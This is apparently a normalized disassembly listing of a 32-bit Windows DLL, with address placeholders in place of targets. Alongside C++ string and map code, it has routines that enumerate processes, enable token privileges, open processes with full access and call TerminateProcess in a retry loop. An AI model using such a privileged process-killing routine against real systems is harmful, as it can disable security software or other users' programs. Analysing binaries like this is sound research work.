mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_10009aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001dd55
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x48
call sub_1000cafd
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi ] eax
lea eax [ esi + 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edx
call sub_1000a260
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x45 ] 0x0
sub_10009b40
push ebx
push ebp
mov ebp [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ebx eax
cmp [ ebp + 0x14 ] edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_1001c746
mov eax [ esi + 0x14 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
jbe r-xdata
mov ebx eax
call sub_1001c70e
lea edx [ eax + ebx ]
cmp edx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop ebp
mov eax esi
pop ebx
retn 0x8
mov edi [ esi + 0x14 ]
add edi ebx
cmp edi 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_1001c70e
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_10009c30
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
pop edi
lea eax [ esi + 0x4 ]
pop ebp
mov [ eax ] 0x0
mov eax esi
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
pop ebp
mov [ eax ] 0x0
mov eax esi
pop ebx
retn 0x8
add ebp 0x4
mov ebp [ ebp + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ eax + edi ] 0x0
mov eax [ esi + 0x4 ]
mov [ eax + edi ] 0x0
pop edi
pop ebp
mov eax esi
pop ebx
retn 0x8
mov ecx [ esi + 0x14 ]
push ebx
mov ebx [ esp + 0x18 ]
add ebp ebx
sub eax ecx
push ebp
push eax
add ecx edx
push ecx
call sub_1000db5a
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_10009c30
push ebp
mov ebp esp
push 0xffffffff
push sub_1001dca0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
xor ebx ebx
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] ebx
cmp ecx ebx
ja r-xdata
mov eax 0xfffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
lea esi [ ecx + ebx ]
push ecx
call sub_1000cafd
add esp 0x4
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ebx
call sub_1000d38f
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_10011014
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000a170
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
mov ecx [ ebp + 0xc ]
test ecx ecx
jbe r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov [ eax ] 0x0
mov [ eax ] ebx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ecx
cmp esi 0x10
jb r-xdata
mov ecx [ edi + 0x4 ]
push ecx
call sub_1000c4b4
mov ecx [ ebp + 0xc ]
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov [ eax + ecx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
push ecx
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1000db5a
mov ecx [ ebp + 0xc ]
add esp 0x10
sub_10009d7e
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push 0x0
mov [ esi + 0x4 ] 0x0
call sub_10011014
int3
mov edx [ esi + 0x4 ]
push edx
call sub_1000c4b4
add esp 0x4
sub_10009db0
push 0xffffffff
push sub_1001de48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x74 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
lea esi [ esp + 0x70 ]
mov ebp eax
call sub_1000a1f0
mov ecx [ ebp ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
push 0x1b
xor esi esi
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] 0x0
call sub_10009630
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_10002450
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_10011014
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x74 ]
mov edi [ eax + 0x8 ]
lea edx [ eax + 0x8 ]
cmp eax ebp
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x45 ] 0x0
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebp ]
mov [ eax ] ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov ecx [ esp + 0x68 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x45 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebp + 0x8 ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ esp + 0x68 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebp
jne r-xdata
mov ecx [ ebp + 0x4 ]
cmp [ ecx ] ebp
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ eax + 0x18 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebp + 0x4 ]
mov [ eax + 0x4 ] edx
lea ecx [ ebp + 0x44 ]
add eax 0x44
cmp eax ecx
je r-xdata
mov bl 0x1
cmp [ ebp + 0x44 ] bl
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x45 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov bl [ ecx ]
mov dl [ eax ]
mov [ eax ] bl
mov [ ecx ] dl
lea eax [ ebp + 0xc ]
push eax
call sub_10004100
push ebp
call sub_1000c4b4
mov ecx [ esp + 0x6c ]
mov eax [ ecx + 0x1c ]
add esp 0x4
test eax eax
jbe r-xdata
mov eax [ esp + 0x68 ]
mov ecx [ eax + 0x18 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_1000a1d0
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ edx ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x74 ]
mov ecx [ ecx ]
mov [ edx + 0x4 ] eax
mov [ edx ] ecx
mov eax edx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
dec eax
mov [ ecx + 0x1c ] eax
mov [ edi + 0x44 ] bl
cmp [ edi + 0x44 ] bl
jne r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov eax [ esp + 0x68 ]
mov [ ecx + 0x44 ] bl
push eax
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_10009a50
mov ecx [ esi ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov edx [ esp + 0x68 ]
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_10009a00
mov ecx [ esi + 0x8 ]
mov ecx [ esp + 0x68 ]
mov edx [ ecx + 0x18 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ edx + 0x4 ]
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] bl
jne r-xdata
jmp r-xdata
mov edx [ ecx ]
cmp [ edx + 0x44 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x44 ] bl
je r-xdata
mov al [ esi + 0x44 ]
mov edx [ esp + 0x68 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
call sub_10009a50
mov eax [ ecx + 0x8 ]
mov edx [ esp + 0x68 ]
mov [ eax + 0x44 ] bl
push edx
mov [ ecx + 0x44 ] 0x0
call sub_10009a00
mov ecx [ esi ]
mov [ ecx + 0x44 ] 0x0
mov dl [ esi + 0x44 ]
mov [ ecx + 0x44 ] dl
mov [ esi + 0x44 ] bl
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x68 ]
push ecx
mov ecx esi
mov [ eax + 0x44 ] bl
call sub_10009a00
jmp r-xdata
mov edx [ ecx ]
mov eax [ esp + 0x68 ]
mov [ edx + 0x44 ] bl
push eax
mov [ ecx + 0x44 ] 0x0
call sub_10009a50
mov ecx [ esi + 0x8 ]
sub_1000a0b0
push 0x48
call sub_1000cafd
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x44 ] 0x1
mov [ eax + 0x45 ] 0x0
retn
mov [ ecx ] 0x0
sub_1000a0f0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
call sub_1000d90c
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
retn
jmp sub_1000d90c
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
lea ecx [ ecx ]
mov [ esi + 0x4 ] ecx
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ esi + 0x4 ] eax
jmp sub_1000d90c
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_1000a170
mov ecx [ esp + 0x4 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_1000cafd
add esp 0x4
add esp 0xc
retn 0x4
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x0
call sub_1000d38f
push r--data
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] r--data
call sub_10011014
int3
sub_1000a1f0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
call sub_1000d90c
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
jmp sub_1000d90c
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
retn
lea esp [ esp ]
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
sub_1000a260
push 0xffffffff
push sub_1001dc78
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_10008f60
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ esp + 0x18 ] ebx
lea eax [ edi + 0x1c ]
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push eax
mov [ ecx + 0x4 ] bl
call sub_10008f60
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0x4
sub_1000a310
cmp [ esi + 0x4 ] 0x0
push edi
mov edi 0x2000
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push edi
call sub_1000cfb2
add esp 0x4
mov [ esi + 0x4 ] eax
pop edi
retn
push 0x0
push 0x2000
push eax
mov eax [ esi ]
push 0x5
call eax
cmp eax 0xc0000004
jne r-xdata
mov ecx [ esi + 0x4 ]
add edi 0x2000
push edi
push ecx
call sub_1000df42
add esp 0x8
push 0x0
push edi
mov edx eax
push edx
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x5
call eax
cmp eax 0xc0000004
je r-xdata
sub_1000a370
sub esp 0x430
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x428 ] eax
mov eax [ esp + 0x438 ]
push ebp
mov ebp [ esp + 0x438 ]
push esi
push edi
push 0x103
lea ecx [ esp + 0x32d ]
push 0x0
push ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x1b ] 0x0
mov [ esp + 0x334 ] 0x0
call sub_1000fe10
push 0x103
lea edx [ esp + 0x231 ]
push 0x0
push edx
mov [ esp + 0x238 ] 0x0
call sub_1000fe10
add esp 0x18
mov esi ebp
call sub_1000a310
push 0x208
lea eax [ esp + 0x1c ]
push 0x0
push eax
call sub_1000fe10
push 0x104
lea ecx [ esp + 0x230 ]
push 0x0
push ecx
call sub_1000fe10
mov eax [ esi + 0x44 ]
add esp 0x18
lea edx [ esp + 0x18 ]
push edx
push eax
call sub_1000a610
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x3c ]
push 0x0
push 0x0
push 0x104
lea ecx [ esp + 0x334 ]
push ecx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ esp + 0x328 ]
push ecx
push eax
lea ecx [ esp + 0x228 ]
push r--data
push ecx
call sub_1000d12a
lea eax [ esp + 0x230 ]
add esp 0x10
mov ecx eax
mov [ esp + 0xf ] 0x1
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x104
mov ecx eax
lea edx [ esp + 0x224 ]
and ecx 0x3
push 0x0
push edx
[ edi ] [ esi ]
call sub_1000fe10
lea eax [ esp + 0x128 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea eax [ esp + 0x18 ]
push eax
je r-xdata
lea ecx [ esp + 0x224 ]
push r--data
push ecx
call sub_1000d12a
add esp 0xc
lea ecx [ esp + 0x120 ]
push ecx
lea edx [ esp + 0x228 ]
push r--data
push edx
call sub_1000d12a
add esp 0x10
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax ecx
mov esi ecx
dec edi
lea eax [ esp + 0x220 ]
mov ecx eax
lea ecx [ ecx ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov edx [ eax ]
add edx eax
cmp [ esp + 0xf ] 0x0
mov [ ebp + 0x4 ] edx
je r-xdata
mov esi [ ebp + 0x4 ]
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ esp + 0x434 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_1000c0a5
add esp 0x430
retn 0x8
sub_1000a570
sub esp 0x20
push esi
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
pop esi
add esp 0x20
retn
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
neg esi
push ecx
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x14 ]
sbb esi esi
push 0x0
and esi 0x2
push edx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] esi
call [ AdjustTokenPrivileges@IAT ]
mov eax [ esp + 0x4 ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
pop esi
add esp 0x20
retn
mov eax 0x1
pop esi
add esp 0x20
retn
sub_1000a610
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000ed80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a72a
jmp sub_1000a72a
lea ecx [ ebp - 0x24 ]
push ecx
push 0x8
push esi
call [ OpenProcessToken@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
lea edx [ ebp + 0x8 ]
push edx
push ebx
push ebx
push 0x1
mov eax [ ebp - 0x24 ]
push eax
mov edi [ GetTokenInformation@IAT ]
call edi
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + ecx ]
push edx
call sub_1000cafd
add esp 0x4
mov esi eax
mov [ ebp - 0x28 ] esi
mov eax [ ebp + 0x8 ]
add eax eax
mov [ ebp + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push esi
push 0x1
mov edx [ ebp - 0x24 ]
push edx
call edi
mov edi eax
mov [ ebp - 0x1c ] edi
call [ GetLastError@IAT ]
cmp edi ebx
je r-xdata
mov esi [ ebp - 0x20 ]
mov eax 0x104
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x2c ]
push ecx
mov eax [ ebp + 0xc ]
lea edx [ eax + 0x104 ]
push edx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov edx [ esi ]
push edx
push ebx
call [ LookupAccountSidA@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
sub_1000a72a
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call sub_1000c4b4
add esp 0x4
sub_1000a770
push esi
push edi
mov edi 0x1
mov eax edi
call sub_1000a570
mov eax [ esp + 0xc ]
push eax
push edi
push 0x1fffff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
xor eax eax
call sub_1000a570
mov eax edi
pop edi
pop esi
retn 0x4
push 0x0
push esi
call [ TerminateProcess@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_1000a7d0
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov esi ecx
mov edi eax
call sub_1000a310
xor ebp ebp
push 0x208
mov [ esp + 0x20 ] ebp
call sub_1000cafd
mov ebx [ MultiByteToWideChar@IAT ]
add esp 0x4
push ebp
push ebp
push 0xffffffff
push edi
push ebp
push ebp
mov [ esp + 0x28 ] eax
call ebx
push eax
mov eax [ esp + 0x14 ]
push eax
push 0xffffffff
push edi
push ebp
push ebp
call ebx
cmp [ eax + 0x3c ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0x1
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x3c ]
mov ecx [ esp + 0x10 ]
push 0x4
push eax
push ecx
call sub_1001c906
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov edx [ eax ]
add edx eax
cmp [ esp + 0x1c ] 0x0
mov [ esi + 0x4 ] edx
je r-xdata
mov edx [ esi + 0x4 ]
mov edi [ edx + 0x44 ]
lea ebx [ eax + 0x1 ]
lea eax [ esp + 0x14 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
mov ebp [ OpenProcessToken@IAT ]
push eax
call ebp
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_1000c4b4
add esp 0x4
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x44
retn
push edi
push 0x1
push 0x1fffff
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ CloseHandle@IAT ]
call edi
lea ecx [ esp + 0x18 ]
push ecx
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call ebp
test eax eax
je r-xdata
push 0x0
push edi
call [ TerminateProcess@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x44 ] edx
mov edx [ esp + 0x24 ]
push 0x0
push edx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov eax [ esp + 0x14 ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
mov ebp ebx
lea edx [ esp + 0x28 ]
push edx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x4c ]
push edx
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x28 ]
push 0x0
push eax
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] 0x0
call [ AdjustTokenPrivileges@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call edi
call [ GetLastError@IAT ]
sub_1000a9b0
push 0xffffffff
push sub_1001e0b5
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x20 ]
xor ebx ebx
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
mov [ edi + 0x4 ] bl
lea esi [ edi + 0x1c ]
push esi
mov [ esp + 0x1c ] ebx
call sub_10009110
mov [ esp + 0x18 ] 0x1
mov eax [ esi + 0x18 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_10009190
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] ebx
mov [ eax ] eax
mov esi [ esi + 0x18 ]
push ebx
push r--data
mov ecx edi
mov [ esi + 0x8 ] esi
call sub_10009630
mov eax edi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x4
sub_1000aa40
push 0xffffffff
push sub_1001e080
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x24 ]
xor ebx ebx
lea esi [ edi + 0x1c ]
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] esi
mov [ esp + 0x1c ] 0x1
call sub_10009460
mov [ esp + 0x1c ] bl
mov esi [ esi ]
push esi
call sub_1000c4b4
add esp 0x4
mov [ esp + 0x1c ] 0xffffffff
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
